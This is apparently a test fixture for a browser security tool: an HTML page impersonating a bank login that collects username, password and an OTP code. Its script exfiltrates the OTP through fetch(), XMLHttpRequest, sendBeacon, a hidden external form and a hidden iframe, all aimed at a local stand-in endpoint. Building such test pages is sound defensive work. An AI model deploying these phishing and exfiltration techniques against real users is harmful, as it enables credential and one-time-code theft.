<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DemoBank Alpha - Secure Online Banking</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/mock-bank/styles.css" />
</head>
<body class="bg-[#0a0f1a] text-[#f1f5f9] min-h-screen py-8 px-4 flex flex-col items-center justify-center">

  <div class="max-w-md w-full bg-[#111827] border border-[#ef4444]/40 rounded-2xl p-8 shadow-2xl shadow-[#ef4444]/10">

    <!-- Brand Impersonation Header -->
    <header class="mb-4 text-center">
      <div class="inline-flex items-center justify-center w-14 h-14 rounded-xl bg-[#06b6d4]/20 border border-[#06b6d4]/30 text-[#06b6d4] mb-3">
        <svg class="w-8 h-8" viewBox="0 0 32 32" fill="none">
          <rect width="32" height="32" rx="8" fill="#0a0f1a" stroke="#06b6d4" stroke-width="2" />
          <path d="M8 8l16 16M24 8L8 24" stroke="#06b6d4" stroke-width="2" stroke-linecap="round" />
        </svg>
      </div>
      <h1 class="text-3xl font-bold text-white tracking-tight">DemoBank Alpha</h1>
      <p class="text-xs text-[#94a3b8] mt-1">Sign In to Your Account</p>
    </header>

    <!-- Phishing Security Warning Badge -->
    <div class="bg-[#450a0a] border border-[#ef4444]/40 rounded-xl p-3 mb-6 text-center">
      <div class="text-[#ef4444] font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-1">
        <span>⚠ Simulated Malicious Webpage</span>
      </div>
      <p class="text-[11px] text-[#fca5a5] mt-1 leading-relaxed">
        Demonstrates brand impersonation and sensitive data exfiltration for X-Ray testing.
      </p>
    </div>

    <!-- Phishing Authentication Form with OTP -->
    <form id="phish-form" novalidate>
      <div class="mb-3">
        <label for="username" class="block text-xs font-medium text-[#94a3b8] mb-1">Username</label>
        <input
          type="text"
          name="username"
          id="username"
          value="demo_user"
          class="w-full px-3 py-2 rounded-lg bg-[#0f172a] border border-[#334155] text-white text-sm focus:outline-none focus:border-[#ef4444]"
          required
        />
      </div>

      <div class="mb-3">
        <label for="password" class="block text-xs font-medium text-[#94a3b8] mb-1">Password</label>
        <input
          type="password"
          name="password"
          id="password"
          value="Password123!"
          class="w-full px-3 py-2 rounded-lg bg-[#0f172a] border border-[#334155] text-white text-sm focus:outline-none focus:border-[#ef4444]"
          required
        />
      </div>

      <!-- Sensitive OTP Field -->
      <div class="mb-5">
        <div class="flex items-center justify-between mb-1">
          <label for="otp" class="block text-xs font-semibold text-[#ef4444]">OTP Code (Sensitive Field)</label>
          <span class="text-[10px] text-[#ef4444] font-mono">autocomplete="one-time-code"</span>
        </div>
        <input
          type="text"
          name="otp"
          id="otp"
          maxlength="64"
          autocomplete="one-time-code"
          inputmode="numeric"
          pattern="[0-9]*"
          placeholder="123456"
          value="947210"
          class="w-full px-4 py-3 rounded-xl bg-[#0f172a] border-2 border-[#ef4444] text-white text-center text-2xl tracking-widest font-mono focus:outline-none focus:shadow-lg focus:shadow-[#ef4444]/20"
          required
        />
      </div>

      <button
        type="submit"
        id="submit-phish-btn"
        class="w-full px-6 py-3 rounded-xl bg-[#ef4444] hover:bg-[#dc2626] text-white font-bold transition-all shadow-lg shadow-[#ef4444]/25"
      >
        Submit Credentials (Triggers fetch() Exfil)
      </button>
    </form>

    <!-- Additional Simulated Attack Trigger Buttons -->
    <div class="mt-6 pt-5 border-t border-[#1f2937]">
      <div class="text-[11px] font-bold text-[#94a3b8] uppercase tracking-wider mb-2">Simulate Other Attack Vectors:</div>
      <div class="grid grid-cols-1 gap-2 text-xs">
        <button
          type="button"
          id="btn-xhr"
          class="w-full py-2 px-3 rounded-lg bg-[#1e293b] hover:bg-[#334155] border border-[#475569] text-left flex items-center justify-between font-mono"
        >
          <span>Exfiltrate OTP via XMLHttpRequest</span>
          <span class="text-[#ef4444] text-[10px]">XHR POST</span>
        </button>

        <button
          type="button"
          id="btn-beacon"
          class="w-full py-2 px-3 rounded-lg bg-[#1e293b] hover:bg-[#334155] border border-[#475569] text-left flex items-center justify-between font-mono"
        >
          <span>Exfiltrate OTP via sendBeacon()</span>
          <span class="text-[#f59e0b] text-[10px]">sendBeacon</span>
        </button>

        <button
          type="button"
          id="btn-form"
          class="w-full py-2 px-3 rounded-lg bg-[#1e293b] hover:bg-[#334155] border border-[#475569] text-left flex items-center justify-between font-mono"
        >
          <span>Submit to External Attacker Form</span>
          <span class="text-[#ef4444] text-[10px]">Form Action</span>
        </button>

        <button
          type="button"
          id="btn-iframe"
          class="w-full py-2 px-3 rounded-lg bg-[#1e293b] hover:bg-[#334155] border border-[#475569] text-left flex items-center justify-between font-mono"
        >
          <span>Inject Hidden Tracking Iframe</span>
          <span class="text-[#94a3b8] text-[10px]">&lt;iframe&gt;</span>
        </button>
      </div>
    </div>

    <!-- Live Event Log -->
    <div class="mt-4 p-3 bg-[#0a0f1a] rounded-lg border border-[#1f2937] text-[11px] font-mono">
      <div class="text-[#94a3b8] mb-1 font-sans font-bold">Attack Activity Monitor:</div>
      <div id="attack-log" class="text-[#f1f5f9] h-16 overflow-y-auto space-y-1">
        <div class="text-[#64748b]">> Page ready. Enter OTP or click an attack button.</div>
      </div>
    </div>
  </div>

  <!-- Hidden iframe container for scenario 7 -->
  <div id="iframe-container" class="hidden"></div>

  <script>
    function logAttack(msg, color) {
      const log = document.getElementById('attack-log');
      const div = document.createElement('div');
      div.className = color ? 'text-' + color : 'text-[#f1f5f9]';
      div.textContent = '> ' + msg;
      log.appendChild(div);
      log.scrollTop = log.scrollHeight;
    }

    // Helper to get OTP value
    function getOtp() {
      return document.getElementById('otp').value || 'XRAY_TEST_OTP_94721';
    }

    // 1. Attack 1: OTP Exfiltration via fetch()
    document.getElementById('phish-form').addEventListener('submit', async function (e) {
      e.preventDefault();
      const otp = getOtp();
      logAttack('Initiating fetch() POST to attacker endpoint with OTP...', 'yellow-400');

      try {
        const res = await fetch('http://127.0.0.1:8000/attacks/fetch-collect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            otp: otp,
            username: document.getElementById('username').value,
            timestamp: Date.now()
          })
        });
        const data = await res.json();
        logAttack('fetch() completed: ' + JSON.stringify(data), 'green-400');
      } catch (err) {
        logAttack('fetch() request was BLOCKED or failed: ' + err.message, 'red-400');
      }
    });

    // 2. Attack 2: OTP Exfiltration via XMLHttpRequest
    document.getElementById('btn-xhr').addEventListener('click', function () {
      const otp = getOtp();
      logAttack('Sending XHR POST to attacker endpoint...', 'yellow-400');
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'http://127.0.0.1:8000/attacks/xhr-exfil', true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.onload = function () {
        logAttack('XHR completed: status ' + xhr.status, 'green-400');
      };
      xhr.onerror = function () {
        logAttack('XHR request was BLOCKED by client/DNR!', 'red-400');
      };
      xhr.send(JSON.stringify({ otp: otp, source: 'xhr-exfil' }));
    });

    // 3. Attack 3: OTP Exfiltration via sendBeacon()
    document.getElementById('btn-beacon').addEventListener('click', function () {
      const otp = getOtp();
      logAttack('Calling navigator.sendBeacon()...', 'yellow-400');
      const blob = new Blob([JSON.stringify({ otp: otp, source: 'beacon-exfil' })], { type: 'application/json' });
      const sent = navigator.sendBeacon('http://127.0.0.1:8000/attacks/sendbeacon-exfil', blob);
      logAttack('sendBeacon dispatched (result: ' + sent + ')', sent ? 'green-400' : 'red-400');
    });

    // 4. Attack 4: External Form Submission
    document.getElementById('btn-form').addEventListener('click', function () {
      logAttack('Simulating external malicious form action...', 'yellow-400');
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = 'http://127.0.0.1:8000/attacks/external-form';
      form.target = '_blank';
      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = 'stolen_otp';
      input.value = getOtp();
      form.appendChild(input);
      document.body.appendChild(form);
      logAttack('External form created with action: ' + form.action, 'red-400');
      // Submitting without navigating parent
      form.submit();
      setTimeout(function () { form.remove(); }, 500);
    });

    // 5. Attack 5: Hidden Iframe Injection
    document.getElementById('btn-iframe').addEventListener('click', function () {
      logAttack('Injecting hidden suspicious tracking iframe...', 'yellow-400');
      const container = document.getElementById('iframe-container');
      container.innerHTML = '';
      const iframe = document.createElement('iframe');
      iframe.src = 'http://127.0.0.1:8000/attacks/tracker.html';
      iframe.style.width = '0px';
      iframe.style.height = '0px';
      iframe.style.border = 'none';
      iframe.style.display = 'none';
      container.appendChild(iframe);
      logAttack('Hidden iframe attached: ' + iframe.src, 'red-400');
    });
  </script>
</body>
</html>
